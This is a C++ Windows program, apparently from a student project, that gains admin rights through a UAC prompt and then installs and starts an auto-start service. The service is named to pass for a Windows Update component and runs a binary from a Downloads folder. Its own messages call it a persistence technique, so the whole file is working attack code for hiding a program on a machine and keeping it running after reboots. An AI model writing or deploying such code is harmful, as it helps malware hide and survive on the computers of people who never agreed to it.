#include <windows.h>
#include <iostream>

bool IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin)) {
             fIsRunAsAdmin = FALSE;
        }
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin;
}
void RelaunchAsAdmin() {
    char szPath[MAX_PATH];
    if (GetModuleFileNameA(NULL, szPath, ARRAYSIZE(szPath))) {
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";           // The "Secret Sauce" for UAC prompt
        sei.lpFile = szPath;
        sei.hwnd = NULL;
        sei.nShow = SW_NORMAL;

        if (!ShellExecuteExA(&sei)) {
            std::cerr << "[-] User refused elevation. Persistence will fail." << std::endl;
        }
        exit(0); // Close the non-admin process
    }
}

int main() {
    if (!IsRunAsAdmin()) {
        std::cerr << "[FAILURE] This technique requires Elevation." << std::endl;
        RelaunchAsAdmin();
        return 1;
    }
    
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        std::cerr << "[FAILURE] OpenSCManager failed. Error: " << GetLastError() << std::endl;
        return 1;
    }
    
    LPCSTR serviceName = "WindowsUpdateAssist";
    LPCSTR displayName = "Windows Update Assistant Service";
    LPCSTR binPath = "C:\\Users\\abdul\\Downloads\\FYP\\Survival-Agent\\knowledge_library\\windows_service_creation.exe";
    
    SC_HANDLE hService = CreateServiceA(
        hSCManager,
        serviceName,
        displayName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        binPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );
    
    if (!hService) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            std::cout << "[INFO] Service already exists. Reconfiguring and starting it..." << std::endl;
            hService = OpenServiceA(hSCManager, serviceName, SERVICE_ALL_ACCESS);
            if (hService) {
                if (!ChangeServiceConfigA(
                    hService,
                    SERVICE_WIN32_OWN_PROCESS,
                    SERVICE_AUTO_START,
                    SERVICE_ERROR_NORMAL,
                    binPath,
                    NULL, NULL, NULL, NULL, NULL, NULL)) {
                    std::cerr << "[-] ChangeServiceConfigA failed. Error: " << GetLastError() << std::endl;
                }
            }
        } else {
            std::cerr << "[FAILURE] CreateServiceA failed. Error: " << GetLastError() << std::endl;
            CloseServiceHandle(hSCManager);
            return 1;
        }
    }
    
    if (hService) {
        if (StartServiceA(hService, 0, NULL)) {
            std::cout << "[SUCCESS] Service " << serviceName << " created and started." << std::endl;
        } else {
            DWORD err = GetLastError();
            if (err == ERROR_SERVICE_ALREADY_RUNNING) {
                std::cout << "[SUCCESS] Service " << serviceName << " is already running." << std::endl;
            } else {
                std::cerr << "[FAILURE] StartServiceA failed. Error: " << err << std::endl;
            }
        }
        CloseServiceHandle(hService);
    }
    
    CloseServiceHandle(hSCManager);
    return 0;
}
